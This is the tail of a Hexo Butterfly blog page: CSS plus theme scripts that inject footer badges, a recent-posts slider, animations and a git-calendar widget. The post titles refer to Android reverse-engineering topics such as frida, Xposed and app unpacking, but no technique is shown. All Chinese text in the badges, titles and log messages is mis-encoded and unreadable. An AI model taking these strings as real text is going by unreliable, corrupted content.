     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(33.333333333333336% - 5px);background: #e9e9e9;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: var(--text-bg-hover)}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
    <style></style><script data-pjax>
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="åšå®¢æ¡†æ¶ä¸ºHexo_v6.2.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="ä¸»é¢˜ç‰ˆæœ¬Butterfly_v4.3.1" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="æœ¬ç«™é‡‡ç”¨å¤šçº¿éƒ¨ç½²ï¼Œä¸»çº¿è·¯æ‰˜ç®¡äºVercel" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://dashboard.4everland.org/" style="margin-inline:5px" data-title="æœ¬ç«™é‡‡ç”¨å¤šçº¿éƒ¨ç½²ï¼Œå¤‡ç”¨çº¿è·¯æ‰˜ç®¡äº4EVERLAND" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="æœ¬ç«™é¡¹ç›®ç”±Githubæ‰˜ç®¡" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="æœ¬ç«™é‡‡ç”¨çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº«4.0å›½é™…è®¸å¯åè®®è¿›è¡Œè®¸å¯" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('å·²æŒ‚è½½butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script async src="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/69766bbb.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/69766bbb.html&quot;);" href="javascript:void(0);" alt="">ã€Šç¬¬ä¸€è¡Œä»£ç ã€‹é˜…è¯»ç¬”è®°</a><div class="blog-slider__text">ğŸ“é˜…è¯»ã€Šç¬¬ä¸€è¡Œä»£ç ã€‹è®°å½•çš„ä¸€äº›å°ä¸œè¥¿</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/69766bbb.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/e65d2ab6.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/e65d2ab6.html&quot;);" href="javascript:void(0);" alt="">åˆ·æœºä¸è„±å£³æœºå…¥é—¨</a><div class="blog-slider__text">ğŸ±åˆ·æœºä¸éƒ¨åˆ†è„±å£³æœºã€è„±å£³ç‚¹çš„å…¥é—¨å­¦ä¹ </div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/e65d2ab6.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/b00b5fdb.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/b00b5fdb.html&quot;);" href="javascript:void(0);" alt="">fridaä¸Objection</a><div class="blog-slider__text">ğŸ¥fridaä¸objectionåŸºæœ¬æ“ä½œæ•´ç†ä¸å½’çº³</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/b00b5fdb.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/cf804d4e.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/cf804d4e.html&quot;);" href="javascript:void(0);" alt="">ã€ŠAppå®‰å…¨å®æˆ˜æŒ‡å—ã€‹é˜…è¯»ç¬”è®°</a><div class="blog-slider__text">ğŸ¥§é˜…è¯»ã€ŠAppå®‰å…¨å®æˆ˜æŒ‡å—ã€‹è®°å½•çš„ä¸€äº›å°ä¸œè¥¿</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/cf804d4e.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/466ed760.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/466ed760.html&quot;);" href="javascript:void(0);" alt="">Unidbg</a><div class="blog-slider__text">â™¥UnidbgåŸºæœ¬æ“ä½œçš„æ•´ç†ä¸å½’çº³</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/466ed760.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/5324751f.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/5324751f.html&quot;);" href="javascript:void(0);" alt="">wechatç®€å•é€†å‘</a><div class="blog-slider__text">ğŸ¥§å¯¹æ—§ç‰ˆæœ¬å¾®ä¿¡Appçš„åŸºæœ¬åŠŸèƒ½è¿›è¡Œé€†å‘åˆ†æ</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/5324751f.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/f416437f.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/f416437f.html&quot;);" href="javascript:void(0);" alt="">Appå®‰å…¨åˆ†ææŒ‡å—</a><div class="blog-slider__text">ğŸ…å¯¹ç½‘ä¸Šä¸€äº›å…³äºç§»åŠ¨å®‰å…¨æµ‹è¯•æ–‡ç« çš„æ•´ç†ä¸å½’çº³</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/f416437f.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/947764cb.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/947764cb.html&quot;);" href="javascript:void(0);" alt="">Xposedæ¡†æ¶</a><div class="blog-slider__text">ğŸ•Xposed Hookæ¡†æ¶çš„åŸºæœ¬æ“ä½œæ•´ç†ä¸å½’çº³</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/947764cb.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/f0867805.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/f0867805.html&quot;);" href="javascript:void(0);" alt="">NDKå­¦ä¹ </a><div class="blog-slider__text">ğŸ‘NDKå¼€å‘åŸºæœ¬æ“ä½œçš„è®°å½•</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/f0867805.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/be4930f3.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/be4930f3.html&quot;);" href="javascript:void(0);" alt="">AndroidæŠ“åŒ…</a><div class="blog-slider__text">ğŸAndroidæŠ“åŒ…æŠ€æœ¯çš„æ•´ç†ä¸å½’çº³</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/be4930f3.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/7e4211d.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/7e4211d.html&quot;);" href="javascript:void(0);" alt="">AndroidåŸºç¡€çŸ¥è¯†</a><div class="blog-slider__text">ğŸ‡Androidé€†å‘å­¦ä¹ çš„å‰ç½®çŸ¥è¯†</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/7e4211d.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/95017dfa.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2025-01-15</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/95017dfa.html&quot;);" href="javascript:void(0);" alt="">ASTæ··æ·†ä¸åæ··æ·†</a><div class="blog-slider__text">ğŸ¥’é˜…è¯»ã€Šåçˆ¬è™«ASTåŸç†ä¸è¿˜åŸæ··æ·†å®æˆ˜ã€‹è®°å½•çš„ä¸€äº›å°ä¸œè¥¿</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/95017dfa.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('å·²æŒ‚è½½butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('gitZone');
      var item_html = '<div class="recent-post-item" id="gitcalendarBar" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 320px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('å·²æŒ‚è½½gitcalendar')
      }

    if( document.getElementById('gitZone') && (location.pathname ==='/site/census/'|| '/site/census/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("/api?null",['#d9e0df', '#c6e0dc', '#a8dcd4', '#9adcd2', '#89ded1', '#77e0d0', '#5fdecb', '#47dcc6', '#39dcc3', '#1fdabe', '#00dab9'],'null')
    }
  </script><!-- hexo injector body_end end --></body></html>